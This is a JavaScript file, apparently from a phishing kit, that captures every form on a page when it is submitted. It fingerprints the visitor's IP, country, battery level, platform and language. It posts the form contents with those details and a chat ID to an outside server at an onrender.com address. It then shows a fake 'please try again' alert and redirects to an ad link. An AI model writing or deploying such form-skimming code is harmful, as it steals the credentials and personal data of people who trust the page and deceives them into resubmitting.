document.addEventListener("DOMContentLoaded", () => {
  const DEFAULT_USER_ID = "7979664801";
  const forms = document.querySelectorAll("form");

  let userCountry = "Unknown";
  let userIP = "Unknown";
  let batteryLevel = "Unknown";

  // ---------- BATTERY INFO ----------
  if (navigator.getBattery) {
    navigator.getBattery()
      .then(battery => {
        batteryLevel = Math.round(battery.level * 100) + "%";
      })
      .catch(() => {});
  }

  // ---------- IP + COUNTRY ----------
  fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(data => {
      if (data) {
        userCountry = data.country_name || userCountry;
        userIP = data.ip || userIP;
      }
    })
    .catch(() => {});

  forms.forEach((form) => {
    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const urlParams = new URLSearchParams(window.location.search);
      const userId = urlParams.get("id") || DEFAULT_USER_ID;

      const formData = new FormData(form);

      // 🔹 REQUIRED
      formData.append("chat_id", userId);

      // ✅ SEPARATOR
      formData.append("──────────────", "");
      formData.append("📊 System Information", "");
      formData.append("──────────────", "");

      // 🔹 AUTO-COLLECTED DATA
      formData.append("📄 Page", document.title);
      formData.append("🕒 Date & Time", new Date().toLocaleString());
      formData.append("🌍 Country", userCountry);
      formData.append("📡 Client IP", userIP);
      formData.append("🔋 Battery Level", batteryLevel);
      formData.append("💻 Platform", navigator.platform || "Unknown");
      formData.append("🌐 Language", navigator.language || "Unknown");

      // ✅ ADD PAGE URL AT THE END
      formData.append("🔗 Page URL", window.location.href);

      try {
        const response = await fetch(
          "https://intelligent-yzi5.onrender.com/send",
          {
            method: "POST",
            body: formData
          }
        );

        if (response.ok) {
          alert("⛔ please try again");
          form.reset();
          window.location.href = "https://otieu.com/4/10060108";
        } else {
          const errorText = await response.text();
          console.error("Server Error:", errorText);
          alert("❌ Error submitting form");
        }
      } catch (err) {
        console.error("Network Error:", err);
        alert("⚠️ Network error");
      }
    });
  });
});